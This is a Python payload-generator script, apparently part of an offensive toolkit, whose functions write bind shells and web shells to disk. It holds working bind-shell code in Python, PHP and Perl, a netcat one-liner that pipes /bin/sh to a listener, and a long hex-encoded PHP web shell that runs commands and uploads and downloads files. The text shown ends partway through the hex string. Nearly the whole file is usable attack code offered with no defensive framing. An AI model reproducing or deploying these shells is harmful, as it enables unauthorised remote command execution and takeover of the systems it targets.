import os
import codecs

def gera_bind(PORTA, executavel_bind, nome_arquivo):
	if executavel_bind == 'python':
		extensao = 'py'
		payloadr = '''import socket as s,subprocess as sp
s1=s.socket(s.AF_INET,s.SOCK_STREAM)
s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1)
s1.bind(("0.0.0.0",#PORTA#))
s1.listen(1)
c,a=s1.accept()
while True:
	d=c.recv(1024).decode()
	p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE)
	c.sendall(p.stdout.read()+p.stderr.read())'''
		payload = payloadr.replace('#PORTA#', str(PORTA))
	if executavel_bind == 'php':
		extensao = 'php'
		payloadr = '''$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP)
socket_bind($s,"0.0.0.0",#PORTA#);
socket_listen($s,1);
$cl=socket_accept($s);
while(1){if(!socket_write($cl,"$ ",2))
exit;
$in=socket_read($cl,100);
$cmd=popen("$in","r");
while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'''
		payload = payloadr.replace('#PORTA#', str(PORTA))
	if executavel_bind == 'nc':
		extensao = 'sh'
		payloadr = '''rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 44444 > /tmp/f'''
		payload = payloadr.replace('#PORTA#', str(PORTA))
	if executavel_bind == 'perl':
		extensao = 'pl'
		payloadr = '''use Socket;$p=#PORTA#;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");};'''
		payload = payloadr.replace('#PORTA#', str(PORTA))
	w = open(f'{nome_arquivo}.{extensao}', 'w')
	w.write(payload)
	w.close()
	return f'{nome_arquivo}.{extensao}'

def gera_payload(IP, PORTA, executavel, shell, nome_arquivo):
	if executavel == 'php12':
		extensao = 'php'
		payloadr = """3C3F7068700D0A0D0A245348454C4C5F434F4E464947203D206172726179280D0A2020202027757365726E616D6527203D3E20277030776E79272C0D0A2020202027686F73746E616D6527203D3E20277368656C6C272C0D0A293B0D0A0D0A66756E6374696F6E20657870616E645061746828247061746829207B0D0A2020202069662028707265675F6D617463682822235E287E5B612D7A412D5A302D395F2E2D5D2A29282F2E2A293F2423222C2024706174682C20246D617463682929207B0D0A20202020202020206578656328226563686F20246D617463685B315D222C20247374646F7574293B0D0A202020202020202072657475726E20247374646F75745B305D202E20246D617463685B325D3B0D0A202020207D0D0A2020202072657475726E2024706174683B0D0A7D0D0A0D0A66756E6374696F6E20616C6C46756E6374696F6E457869737428246C697374203D206172726179282929207B0D0A20202020666F72656163682028246C6973742061732024656E74727929207B0D0A2020202020202020696620282166756E6374696F6E5F6578697374732824656E7472792929207B0D0A20202020202020202020202072657475726E2066616C73653B0D0A20202020202020207D0D0A202020207D0D0A2020202072657475726E20747275653B0D0A7D0D0A0D0A66756E6374696F6E2065786563757465436F6D6D616E642824636D6429207B0D0A20202020246F7574707574203D2027273B0D0A202020206966202866756E6374696F6E5F657869737473282765786563272929207B0D0A2020202020202020657865632824636D642C20246F7574707574293B0D0A2020202020202020246F7574707574203D20696D706C6F646528225C6E222C20246F7574707574293B0D0A202020207D20656C7365206966202866756E6374696F6E5F65786973747328277368656C6C5F65786563272929207B0D0A2020202020202020246F7574707574203D207368656C6C5F657865632824636D64293B0D0A202020207D20656C73652069662028616C6C46756E6374696F6E4578697374286172726179282773797374656D272C20276F625F7374617274272C20276F625F6765745F636F6E74656E7473272C20276F625F656E645F636C65616E27292929207B0D0A20202020202020206F625F737461727428293B0D0A202020202020202073797374656D2824636D64293B0D0A2020202020202020246F7574707574203D206F625F6765745F636F6E74656E747328293B0D0A20202020202020206F625F656E645F636C65616E28293B0D0A202020207D20656C73652069662028616C6C46756E6374696F6E457869737428617272617928277061737374687275272C20276F625F7374617274272C20276F625F6765745F636F6E74656E7473272C20276F625F656E645F636C65616E27292929207B0D0A20202020202020206F625F737461727428293B0D0A202020202020202070617373746872752824636D64293B0D0A2020202020202020246F7574707574203D206F625F6765745F636F6E74656E747328293B0D0A20202020202020206F625F656E645F636C65616E28293B0D0A202020207D20656C73652069662028616C6C46756E6374696F6E45786973742861727261792827706F70656E272C202766656F66272C20276672656164272C202770636C6F736527292929207B0D0A20202020202020202468616E646C65203D20706F70656E2824636D642C20277227293B0D0A20202020202020207768696C6520282166656F66282468616E646C652929207B0D0A202020202020202020202020246F7574707574202E3D206672656164282468616E646C652C2034303936293B0D0A20202020202020207D0D0A202020202020202070636C6F7365282468616E646C65293B0D0A202020207D20656C73652069662028616C6C46756E6374696F6E4578697374286172726179282770726F635F6F70656E272C202773747265616D5F6765745F636F6E74656E7473272C202770726F635F636C6F736527292929207B0D0A20202020202020202468616E646C65203D2070726F635F6F70656E2824636D642C2061727261792830203D3E206172726179282770697065272C20277227292C2031203D3E206172726179282770697065272C2027772729292C20247069706573293B0D0A2020202020202020246F7574707574203D2073747265616D5F6765745F636F6E74656E7473282470697065735B315D293B0D0A202020202020202070726F635F636C6F7365282468616E646C65293B0D0A202020207D0D0A2020202072657475726E20246F75747075743B0D0A7D0D0A0D0A66756E6374696F6E20697352756E6E696E6757696E646F77732829207B0D0A2020202072657475726E2073747269706F73285048505F4F532C202257494E2229203D3D3D20303B0D0A7D0D0A0D0A66756E6374696F6E20666561747572655368656C6C2824636D642C202463776429207B0D0A20202020247374646F7574203D2022223B0D0A0D0A2020202069662028707265675F6D6174636828222F5E5C732A63645C732A28323E2631293F242F222C2024636D642929207B0D0A2020202020202020636864697228657870616E645061746828227E2229293B0D0A202020207D20656C736569662028707265675F6D6174636828222F5E5C732A63645C732B282E2B295C732A28323E2631293F242F222C2024636D642929207B0D0A202020202020202063686469722824637764293B0D0A2020202020202020707265675F6D6174636828222F5E5C732A63645C732B285B5E5C735D2B295C732A28323E2631293F242F222C2024636D642C20246D61746368293B0D0A2020202020202020636864697228657870616E645061746828246D617463685B315D29293B0D0A202020207D20656C736569662028707265675F6D6174636828222F5E5C732A646F776E6C6F61645C732B5B5E5C735D2B5C732A28323E2631293F242F222C2024636D642929207B0D0A202020202020202063686469722824637764293B0D0A2020202020202020707265675F6D6174636828222F5E5C732A646F776E6C6F61645C732B285B5E5C735D2B295C732A28323E2631293F242F222C2024636D642C20246D61746368293B0D0A202020202020202072657475726E2066656174757265446F776E6C6F616428246D617463685B315D293B0D0A202020207D20656C7365207B0D0A202020202020202063686469722824637764293B0D0A2020202020202020247374646F7574203D2065786563757465436F6D6D616E642824636D64293B0D0A202020207D0D0A0D0A2020202072657475726E206172726179280D0A2020202020202020227374646F757422203D3E206261736536345F656E636F646528247374646F7574292C0D0A20202020202020202263776422203D3E206261736536345F656E636F6465286765746377642829290D0A20202020293B0D0A7D0D0A0D0A66756E6374696F6E20666561747572655077642829207B0D0A2020202072657475726E206172726179282263776422203D3E206261736536345F656E636F646528676574637764282929293B0D0A7D0D0A0D0A66756E6374696F6E206665617475726548696E74282466696C654E616D652C20246377642C20247479706529207B0D0A2020202063686469722824637764293B0D0A20202020696620282474797065203D3D2027636D642729207B0D0A202020202020202024636D64203D2022636F6D7067656E202D63202466696C654E616D65223B0D0A202020207D20656C7365207B0D0A202020202020202024636D64203D2022636F6D7067656E202D66202466696C654E616D65223B0D0A202020207D0D0A2020202024636D64203D2022235348454C4C23202D63205C2224636D645C22223B0D0A202020202466696C6573203D206578706C6F646528225C6E222C207368656C6C5F657865632824636D6429293B0D0A20202020666F726561636820282466696C657320617320262466696C656E616D6529207B0D0A20202020202020202466696C656E616D65203D206261736536345F656E636F6465282466696C656E616D65293B0D0A202020207D0D0A2020202072657475726E206172726179280D0A20202020202020202766696C657327203D3E202466696C65732C0D0A20202020293B0D0A7D0D0A0D0A66756E6374696F6E2066656174757265446F776E6C6F6164282466696C655061746829207B0D0A202020202466696C65203D204066696C655F6765745F636F6E74656E7473282466696C6550617468293B0D0A20202020696620282466696C65203D3D3D2046414C534529207B0D0A202020202020202072657475726E206172726179280D0A202020202020202020202020277374646F757427203D3E206261736536345F656E636F6465282746696C65206E6F7420666F756E64202F206E6F2072656164207065726D697373696F6E2E27292C0D0A2020202020202020202020202763776427203D3E206261736536345F656E636F6465286765746377642829290D0A2020202020202020293B0D0A202020207D20656C7365207B0D0A202020202020202072657475726E206172726179280D0A202020202020202020202020276E616D6527203D3E206261736536345F656E636F646528626173656E616D65282466696C655061746829292C0D0A2020202020202020202020202766696C6527203D3E206261736536345F656E636F6465282466696C65290D0A2020202020202020293B0D0A202020207D0D0A7D0D0A0D0A66756E6374696F6E206665617475726555706C6F61642824706174682C202466696C652C202463776429207B0D0A2020202063686469722824637764293B0D0A202020202466203D2040666F70656E2824706174682C2027776227293B0D0A20202020696620282466203D3D3D2046414C534529207B0D0A202020202020202072657475726E206172726179280D0A202020202020202020202020277374646F757427203D3E206261736536345F656E636F64652827496E76616C69642070617468202F206E6F207772697465207065726D697373696F6E2E27292C0D0A2020202020202020202020202763776427203D3E206261736536345F656E636F6465286765746377642829290D0A2020202020202020293B0D0A202020207D20656C7365207B0D0A20202020202020206677726974652824662C206261736536345F6465636F6465282466696C6529293B0D0A202020202020202066636C6F7365282466293B0D0A202020202020202072657475726E206172726179280D0A202020202020202020202020277374646F757427203D3E206261736536345F656E636F64652827446F6E652E27292C0D0A2020202020202020202020202763776427203D3E206261736536345F656E636F6465286765746377642829290D0A2020202020202020293B0D0A202020207D0D0A7D0D0A0D0A66756E6374696F6E20696E69745368656C6C436F6E6669672829207B0D0A20202020676C6F62616C20245348454C4C5F434F4E4649473B0D0A0D0A2020202069662028697352756E6E696E6757696E646F7773282929207B0D0A202020202020202024757365726E616D65203D20676574656E762827555345524E414D4527293B0D0A20202020202020206966202824757365726E616D6520213D3D2066616C736529207B0D0A202020202020202020202020245348454C4C5F434F4E4649475B27757365726E616D65275D203D2024757365726E616D653B0D0A20202020202020207D0D0A202020207D20656C7365207B0D0A2020202020202020247077756964203D20706F7369785F676574707775696428706F7369785F676574657569642829293B0D0A20202020202020206966202824707775696420213D3D2066616C736529207B0D0A202020202020202020202020245348454C4C5F434F4E4649475B27757365726E616D65275D203D202470777569645B276E616D65275D3B0D0A20202020202020207D0D0A202020207D0D0A0D0A2020202024686F73746E616D65203D20676574686F73746E616D6528293B0D0A202020206966202824686F73746E616D6520213D3D2066616C736529207B0D0A2020202020202020245348454C4C5F434F4E4649475B27686F73746E616D65275D203D2024686F73746E616D653B0D0A202020207D0D0A7D0D0A0D0A69662028697373657428245F4745545B2266656174757265225D2929207B0D0A0D0A2020202024726573706F6E7365203D204E554C4C3B0D0A0D0A202020207377697463682028245F4745545B2266656174757265225D29207B0D0A20202020202020206361736520227368656C6C223A0D0A20202020202020202020202024636D64203D20245F504F53545B27636D64275D3B0D0A2020202020202020202020206966202821707265675F6D6174636828272F323E2F272C2024636D642929207B0D0A2020202020202020202020202020202024636D64202E3D202720323E2631273B0D0A2020202020202020202020207D0D0A20202020202020202020202024726573706F6E7365203D20666561747572655368656C6C2824636D642C20245F504F53545B22637764225D293B0D0A202020202020202020202020627265616B3B0D0A2020202020202020636173652022707764223A0D0A20202020202020202020202024726573706F6E7365203D206665617475726550776428293B0D0A202020202020202020202020627265616B3B0D0A202020202020202063617365202268696E74223A0D0A20202020202020202020202024726573706F6E7365203D206665617475726548696E7428245F504F53545B2766696C656E616D65275D2C20245F504F53545B27637764275D2C20245F504F53545B2774797065275D293B0D0A202020202020202020202020627265616B3B0D0A202020202020202063617365202775706C6F6164273A0D0A20202020202020202020202024726573706F6E7365203D206665617475726555706C6F616428245F504F53545B2770617468275D2C20245F504F53545B2766696C65275D2C20245F504F53545B27637764275D293B0D0A202020207D0D0A0D0A202020206865616465722822436F6E74656E742D547970653A206170706C69636174696F6E2F6A736F6E22293B0D0A202020206563686F206A736F6E5F656E636F64652824726573706F6E7365293B0D0A2020202064696528293B0D0A7D20656C7365207B0D0A20202020696E69745368656C6C436F6E66696728293B0D0A7D0D0A0D0A3F3E3C21444F43545950452068746D6C3E0D0A0D0A3C68746D6C3E0D0A0D0A202020203C686561643E0D0A20202020202020203C6D65746120636861727365743D225554462D3822202F3E0D0A20202020202020203C7469746C653E7030776E79407368656C6C3A7E233C2F7469746C653E0D0A20202020202020203C6D657461206E616D653D2276696577706F72742220636F6E74656E743D2277696474683D6465766963652D77696474682C20696E697469616C2D7363616C653D312E3022202F3E0D0A20202020202020203C7374796C653E0D0A20202020202020202020202068746D6C2C20626F6479207B0D0A202020202020202020202020202020206D617267696E3A20303B0D0A2020202020202020202020202020202070616464696E673A20303B0D0A202020202020202020202020202020206261636B67726F756E643A20233333333B0D0A20202020202020202020202020202020636F6C6F723A20236565653B0D0A20202020202020202020202020202020666F6E742D66616D696C793A206D6F6E6F73706163653B0D0A2020202020202020202020202020202077696474683A2031303076773B0D0A202020202020202020202020202020206865696768743A2031303076683B0D0A202020202020202020202020202020206F766572666C6F773A2068696464656E3B0D0A2020202020202020202020207D0D0A0D0A2020202020202020202020202A3A3A2D7765626B69742D7363726F6C6C6261722D747261636B207B0D0A20202020202020202020202020202020626F726465722D7261646975733A203870783B0D0A202020202020202020202020202020206261636B67726F756E642D636F6C6F723A20233335333533353B0D0A2020202020202020202020207D0D0A0D0A2020202020202020202020202A3A3A2D7765626B69742D7363726F6C6C626172207B0D0A2020202020202020202020202020202077696474683A203870783B0D0A202020202020202020202020202020206865696768743A203870783B0D0A2020202020202020202020207D0D0A0D0A2020202020202020202020202A3A3A2D7765626B69742D7363726F6C6C6261722D7468756D62207B0D0A20202020202020202020202020202020626F726465722D7261646975733A203870783B0D0A202020202020202020202020202020202D7765626B69742D626F782D736861646F773A20696E7365742030203020367078207267626128302C302C302C2E33293B0D0A202020202020202020202020202020206261636B67726F756E642D636F6C6F723A20236263626362633B0D0A2020202020202020202020207D0D0A0D0A202020202020202020202020237368656C6C207B0D0A202020202020202020202020202020206261636B67726F756E643A20233232323B0D0A20202020202020202020202020202020626F782D736861646F773A2030203020357078207267626128302C20302C20302C202E33293B0D0A20202020202020202020202020202020666F6E742D73697A653A20313070743B0D0A20202020202020202020202020202020646973706C61793A20666C65783B0D0A20202020202020202020202020202020666C65782D646972656374696F6E3A20636F6C756D6E3B0D0A20202020202020202020202020202020616C69676E2D6974656D733A20737472657463683B0D0A202020202020202020202020202020206D61782D77696474683A2063616C63283130307677202D2032202A20766172282D2D7368656C6C2D6D617267696E29293B0D0A202020202020202020202020202020206D61782D6865696768743A2063616C63283130307668202D2032202A20766172282D2D7368656C6C2D6D617267696E29293B0D0A20202020202020202020202020202020726573697A653A20626F74683B0D0A202020202020202020202020202020206F766572666C6F773A2068696464656E3B0D0A2020202020202020202020202020202077696474683A20313030253B0D0A202020202020202020202020202020206865696768743A20313030253B0D0A202020202020202020202020202020206D617267696E3A20766172282D2D7368656C6C2D6D617267696E29206175746F3B0D0A2020202020202020202020207D0D0A0D0A202020202020202020202020237368656C6C2D636F6E74656E74207B0D0A202020202020202020202020202020206F766572666C6F773A206175746F3B0D0A2020202020202020202020202020202070616464696E673A203570783B0D0A2020202020202020202020202020202077686974652D73706163653A207072652D777261703B0D0A20202020202020202020202020202020666C65782D67726F773A20313B0D0A2020202020202020202020207D0D0A0D0A202020202020202020202020237368656C6C2D6C6F676F207B0D0A20202020202020202020202020202020666F6E742D7765696768743A20626F6C643B0D0A20202020202020202020202020202020636F6C6F723A20234646343138303B0D0A20202020202020202020202020202020746578742D616C69676E3A2063656E7465723B0D0A2020202020202020202020207D0D0A0D0A2020202020202020202020203A726F6F74207B0D0A202020202020202020202020202020202D2D7368656C6C2D6D617267696E3A20323570783B0D0A2020202020202020202020207D0D0A0D0A202020202020202020202020406D6564696120286D696E2D77696474683A2031323030707829207B0D0A202020202020202020202020202020203A726F6F74207B0D0A20202020202020202020202020202020202020202D2D7368656C6C2D6D617267696E3A20353070782021696D706F7274616E743B0D0A202020202020202020202020202020207D0D0A2020202020202020202020207D0D0A0D0A202020202020202020202020406D6564696120286D61782D77696474683A203939317078292C0D0A20202020202020202020202020202020202020286D61782D6865696768743A20363030707829207B0D0A20202020202020202020202020202020237368656C6C2D6C6F676F207B0D0A2020202020202020202020202020202020202020666F6E742D73697A653A203670783B0D0A20202020202020202020202020202020202020206D617267696E3A202D3235707820303B0D0A202020202020202020202020202020207D0D0A202020202020202020202020202020203A726F6F74207B0D0A20202020202020202020202020202020202020202D2D7368656C6C2D6D617267696E3A20302021696D706F7274616E743B0D0A202020202020202020202020202020207D0D0A20202020202020202020202020202020237368656C6C207B0D0A2020202020202020202020202020202020202020726573697A653A206E6F6E653B0D0A202020202020202020202020202020207D0D0A2020202020202020202020207D0D0A0D0A202020202020202020202020406D6564696120286D61782D77696474683A20373637707829207B0D0A20202020202020202020202020202020237368656C6C2D696E707574207B0D0A2020202020202020202020202020202020202020666C65782D646972656374696F6E3A20636F6C756D6E3B0D0A202020202020202020202020202020207D0D0A2020202020202020202020207D0D0A0D0A202020202020202020202020406D6564696120286D61782D77696474683A20333230707829207B0D0A20202020202020202020202020202020237368656C6C2D6C6F676F207B0D0A2020202020202020202020202020202020202020666F6E742D73697A653A203570783B0D0A202020202020202020202020202020207D0D0A2020202020202020202020207D0D0A0D0A2020202020202020202020202E7368656C6C2D70726F6D7074207B0D0A20202020202020202020202020202020666F6E742D7765696768743A20626F6C643B0D0A20202020202020202020202020202020636F6C6F723A20233735444630423B0D0A2020202020202020202020207D0D0A0D0A2020202020202020202020202E7368656C6C2D70726F6D7074203E207370616E207B0D0A20202020202020202020202020202020636F6C6F723A20233142433945373B0D0A2020202020202020202020207D0D0A0D0A202020202020202020202020237368656C6C2D696E707574207B0D0A20202020202020202020202020202020646973706C61793A20666C65783B0D0A20202020202020202020202020202020626F782D736861646F773A2030202D3170782030207267626128302C20302C20302C202E33293B0D0A20202020202020202020202020202020626F726465722D746F703A2072676261283235352C203235352C203235352C202E30352920736F6C6964203170783B0D0A2020202020202020202020202020202070616464696E673A203130707820303B0D0A2020202020202020202020207D0D0A0D0A202020202020202020202020237368656C6C2D696E707574203E206C6162656C207B0D0A20202020202020202020202020202020666C65782D67726F773A20303B0D0A20202020202020202020202020202020646973706C61793A20626C6F636B3B0D0A2020202020202020202020202020202070616464696E673A2030203570783B0D0A202020202020202020202020202020206865696768743A20333070783B0D0A202020202020202020202020202020206C696E652D6865696768743A20333070783B0D0A2020202020202020202020207D0D0A0D0A202020202020202020202020237368656C6C2D696E70757420237368656C6C2D636D64207B0D0A202020202020202020202020202020206865696768743A20333070783B0D0A202020202020202020202020202020206C696E652D6865696768743A20333070783B0D0A20202020202020202020202020202020626F726465723A206E6F6E653B0D0A202020202020202020202020202020206261636B67726F756E643A207472616E73706172656E743B0D0A20202020202020202020202020202020636F6C6F723A20236565653B0D0A20202020202020202020202020202020666F6E742D66616D696C793A206D6F6E6F73706163653B0D0A20202020202020202020202020202020666F6E742D73697A653A20313070743B0D0A2020202020202020202020202020202077696474683A20313030253B0D0A20202020202020202020202020202020616C69676E2D73656C663A2063656E7465723B0D0A20202020202020202020202020202020626F782D73697A696E673A20626F726465722D626F783B0D0A2020202020202020202020207D0D0A0D0A202020202020202020202020237368656C6C2D696E70757420646976207B0D0A20202020202020202020202020202020666C65782D67726F773A20313B0D0A20202020202020202020202020202020616C69676E2D6974656D733A20737472657463683B0D0A2020202020202020202020207D0D0A0D0A202020202020202020202020237368656C6C2D696E70757420696E707574207B0D0A202020202020202020202020202020206F75746C696E653A206E6F6E653B0D0A2020202020202020202020207D0D0A20202020202020203C2F7374796C653E0D0A0D0A20202020202020203C7363726970743E0D0A202020202020202020202020766172205348454C4C5F434F4E464947203D203C3F706870206563686F206A736F6E5F656E636F646528245348454C4C5F434F4E464947293B203F3E3B0D0A20202020202020202020202076617220435744203D206E756C6C3B0D0A20202020202020202020202076617220636F6D6D616E64486973746F7279203D205B5D3B0D0A20202020202020202020202076617220686973746F7279506F736974696F6E203D20303B0D0A20202020202020202020202076617220655368656C6C436D64496E707574203D206E756C6C3B0D0A20202020202020202020202076617220655368656C6C436F6E74656E74203D206E756C6C3B0D0A0D0A20202020202020202020202066756E6374696F6E205F696E73657274436F6D6D616E6428636F6D6D616E6429207B0D0A20202020202020202020202020202020655368656C6C436F6E74656E742E696E6E657248544D4C202B3D20225C6E5C6E223B0D0A20202020202020202020202020202020655368656C6C436F6E74656E742E696E6E657248544D4C202B3D20273C7370616E20636C6173733D5C227368656C6C2D70726F6D70745C223E27202B2067656E50726F6D70742843574429202B20273C2F7370616E3E20273B0D0A20202020202020202020202020202020655368656C6C436F6E74656E742E696E6E657248544D4C202B3D2065736361706548746D6C28636F6D6D616E64293B0D0A20202020202020202020202020202020655368656C6C436F6E74656E742E696E6E657248544D4C202B3D20225C6E223B0D0A20202020202020202020202020202020655368656C6C436F6E74656E742E7363726F6C6C546F70203D20655368656C6C436F6E74656E742E7363726F6C6C4865696768743B0D0A2020202020202020202020207D0D0A0D0A20202020202020202020202066756E6374696F6E205F696E736572745374646F7574287374646F757429207B0D0A20202020202020202020202020202020655368656C6C436F6E74656E742E696E6E657248544D4C202B3D2065736361706548746D6C287374646F7574293B0D0A20202020202020202020202020202020655368656C6C436F6E74656E742E7363726F6C6C546F70203D20655368656C6C436F6E74656E742E7363726F6C6C4865696768743B0D0A2020202020202020202020207D0D0A0D0A20202020202020202020202066756E6374696F6E205F64656665722863616C6C6261636B29207B0D0A2020202020202020202020202020202073657454696D656F75742863616C6C6261636B2C2030293B0D0A2020202020202020202020207D0D0A0D0A20202020202020202020202066756E6374696F6E20666561747572655368656C6C28636F6D6D616E6429207B0D0A0D0A202020202020202020202020202020205F696E73657274436F6D6D616E6428636F6D6D616E64293B0D0A20202020202020202020202020202020696620282F5E5C732A75706C6F61645C732B5B5E5C735D2B5C732A242F2E7465737428636F6D6D616E642929207B0D0A20202020202020202020202020202020202020206665617475726555706C6F616428636F6D6D616E642E6D61746368282F5E5C732A75706C6F61645C732B285B5E5C735D2B295C732A242F295B315D293B0D0A202020202020202020202020202020207D20656C736520696620282F5E5C732A636C6561725C732A242F2E7465737428636F6D6D616E642929207B0D0A20202020202020202020202020202020202020202F2F204261636B656E64207368656C6C205445524D20656E7669726F6E6D656E74207661726961626C65206E6F74207365742E20436C65617220636F6D6D616E6420686973746F72792066726F6D20554920627574206B65657020696E206275666665720D0A2020202020202020202020202020202020202020655368656C6C436F6E74656E742E696E6E657248544D4C203D2027273B0D0A202020202020202020202020202020207D20656C7365207B0D0A20202020202020202020202020202020202020206D616B655265717565737428223F666561747572653D7368656C6C222C207B636D643A20636F6D6D616E642C206377643A204357447D2C2066756E6374696F6E2028726573706F6E736529207B0D0A20202020202020202020202020202020202020202020202069662028726573706F6E73652E6861734F776E50726F7065727479282766696C65272929207B0D0A2020202020202020202020202020202020202020202020202020202066656174757265446F776E6C6F61642861746F6228726573706F6E73652E6E616D65292C20726573706F6E73652E66696C65290D0A2020202020202020202020202020202020202020202020207D20656C7365207B0D0A202020202020202020202020202020202020202020202020202020205F696E736572745374646F75742861746F6228726573706F6E73652E7374646F757429293B0D0A202020202020202020202020202020202020202020202020202020207570646174654377642861746F6228726573706F6E73652E63776429293B0D0A2020202020202020202020202020202020202020202020207D0D0A20202020202020202020202020202020202020207D293B0D0A202020202020202020202020202020207D0D0A2020202020202020202020207D0D0A0D0A20202020202020202020202066756E6374696F6E206665617475726548696E742829207B0D0A2020202020202020202020202020202069662028655368656C6C436D64496E7075742E76616C75652E7472696D28292E6C656E677468203D3D3D2030292072657475726E3B20202F2F206669656C6420697320656D707479202D3E206E6F7468696E6720746F20636F6D706C6574650D0A0D0A2020202020202020202020202020202066756E6374696F6E205F7265717565737443616C6C6261636B286461746129207B0D0A202020202020202020202020202020202020202069662028646174612E66696C65732E6C656E677468203C3D2031292072657475726E3B20202F2F206E6F20636F6D706C6574696F6E0D0A2020202020202020202020202020202020202020646174612E66696C6573203D20646174612E66696C65732E6D61702866756E6374696F6E2866696C65297B0D0A20202020202020202020202020202020202020202020202072657475726E2061746F622866696C65293B0D0A20202020202020202020202020202020202020207D293B0D0A202020202020202020202020202020202020202069662028646174612E66696C65732E6C656E677468203D3D3D203229207B0D0A2020202020202020202020202020202020202020202020206966202874797065203D3D3D2027636D642729207B0D0A20202020202020202020202020202020202020202020202020202020655368656C6C436D64496E7075742E76616C7565203D20646174612E66696C65735B305D3B0D0A2020202020202020202020202020202020202020202020207D20656C7365207B0D0A202020202020202020202020202020202020202020202020202020207661722063757272656E7456616C7565203D20655368656C6C436D64496E7075742E76616C75653B0D0A20202020202020202020202020202020202020202020202020202020655368656C6C436D64496E7075742E76616C7565203D2063757272656E7456616C75652E7265706C616365282F285B5E5C735D2A29242F2C20646174612E66696C65735B305D293B0D0A2020202020202020202020202020202020202020202020207D0D0A20202020202020202020202020202020202020207D20656C7365207B0D0A2020202020202020202020202020202020202020202020205F696E73657274436F6D6D616E6428655368656C6C436D64496E7075742E76616C7565293B0D0A2020202020202020202020202020202020202020202020205F696E736572745374646F757428646174612E66696C65732E6A6F696E28225C6E2229293B0D0A20202020202020202020202020202020202020207D0D0A202020202020202020202020202020207D0D0A0D0A202020202020202020202020202020207661722063757272656E74436D64203D20655368656C6C436D64496E7075742E76616C75652E73706C697428222022293B0D0A202020202020202020202020202020207661722074797065203D202863757272656E74436D642E6C656E677468203D3D3D203129203F2022636D6422203A202266696C65223B0D0A202020202020202020202020202020207661722066696C654E616D65203D202874797065203D3D3D2022636D642229203F2063757272656E74436D645B305D203A2063757272656E74436D645B63757272656E74436D642E6C656E677468202D20315D3B0D0A0D0A202020202020202020202020202020206D616B6552657175657374280D0A2020202020202020202020202020202020202020223F666561747572653D68696E74222C0D0A20202020202020202020202020202020202020207B0D0A20202020202020202020202020202020202020202020202066696C656E616D653A2066696C654E616D652C0D0A2020202020202020202020202020202020202020202020206377643A204357442C0D0A202020202020202020202020202020202020202020202020747970653A20747970650D0A20202020202020202020202020202020202020207D2C0D0A20202020202020202020202020202020202020205F7265717565737443616C6C6261636B0D0A20202020202020202020202020202020293B0D0A0D0A2020202020202020202020207D0D0A0D0A20202020202020202020202066756E6374696F6E2066656174757265446F776E6C6F6164286E616D652C2066696C6529207B0D0A2020202020202020202020202020202076617220656C656D656E74203D20646F63756D656E742E637265617465456C656D656E7428276127293B0D0A20202020202020202020202020202020656C656D656E742E736574417474726962757465282768726566272C2027646174613A6170706C69636174696F6E2F6F637465742D73747265616D3B6261736536342C27202B2066696C65293B0D0A20202020202020202020202020202020656C656D656E742E7365744174747269627574652827646F776E6C6F6164272C206E616D65293B0D0A20202020202020202020202020202020656C656D656E742E7374796C652E646973706C6179203D20276E6F6E65273B0D0A20202020202020202020202020202020646F63756D656E742E626F64792E617070656E644368696C6428656C656D656E74293B0D0A20202020202020202020202020202020656C656D656E742E636C69636B28293B0D0A20202020202020202020202020202020646F63756D656E742E626F64792E72656D6F76654368696C6428656C656D656E74293B0D0A202020202020202020202020202020205F696E736572745374646F75742827446F6E652E27293B0D0A2020202020202020202020207D0D0A0D0A20202020202020202020202066756E6374696F6E206665617475726555706C6F6164287061746829207B0D0A2020202020202020202020202020202076617220656C656D656E74203D20646F63756D656E742E637265617465456C656D656E742827696E70757427293B0D0A20202020202020202020202020202020656C656D656E742E736574417474726962757465282774797065272C202766696C6527293B0D0A20202020202020202020202020202020656C656D656E742E7374796C652E646973706C6179203D20276E6F6E65273B0D0A20202020202020202020202020202020646F63756D656E742E626F64792E617070656E644368696C6428656C656D656E74293B0D0A20202020202020202020202020202020656C656D656E742E6164644576656E744C697374656E657228276368616E6765272C2066756E6374696F6E202829207B0D0A20202020202020202020202020202020202020207661722070726F6D697365203D2067657442617365363428656C656D656E742E66696C65735B305D293B0D0A202020202020202020202020202020202020202070726F6D6973652E7468656E2866756E6374696F6E202866696C6529207B0D0A2020202020202020202020202020202020202020202020206D616B655265717565737428273F666561747572653D75706C6F6164272C207B706174683A20706174682C2066696C653A2066696C652C206377643A204357447D2C2066756E6374696F6E2028726573706F6E736529207B0D0A202020202020202020202020202020202020202020202020202020205F696E736572745374646F75742861746F6228726573706F6E73652E7374646F757429293B0D0A202020202020202020202020202020202020202020202020202020207570646174654377642861746F6228726573706F6E73652E63776429293B0D0A2020202020202020202020202020202020202020202020207D293B0D0A20202020202020202020202020202020202020207D2C2066756E6374696F6E202829207B0D0A2020202020202020202020202020202020202020202020205F696E736572745374646F75742827416E20756E6B6E6F776E20636C69656E742D73696465206572726F72206F636375727265642E27293B0D0A20202020202020202020202020202020202020207D293B0D0A202020202020202020202020202020207D293B0D0A20202020202020202020202020202020656C656D656E742E636C69636B28293B0D0A20202020202020202020202020202020646F63756D656E742E626F64792E72656D6F76654368696C6428656C656D656E74293B0D0A2020202020202020202020207D0D0A0D0A20202020202020202020202066756E6374696F6E206765744261736536342866696C652C206F6E4C6F616443616C6C6261636B29207B0D0A2020202020202020202020202020202072657475726E206E65772050726F6D6973652866756E6374696F6E287265736F6C76652C2072656A65637429207B0D0A202020202020202020202020202020202020202076617220726561646572203D206E65772046696C6552656164657228293B0D0A20202020202020202020202020202020202020207265616465722E6F6E6C6F6164203D2066756E6374696F6E2829207B207265736F6C7665287265616465722E726573756C742E6D61746368282F6261736536342C282E2A29242F295B315D293B207D3B0D0A20202020202020202020202020202020202020207265616465722E6F6E6572726F72203D2072656A6563743B0D0A20202020202020202020202020202020202020207265616465722E7265616441734461746155524C2866696C65293B0D0A202020202020202020202020202020207D293B0D0A2020202020202020202020207D0D0A0D0A20202020202020202020202066756E6374696F6E2067656E50726F6D70742863776429207B0D0A2020202020202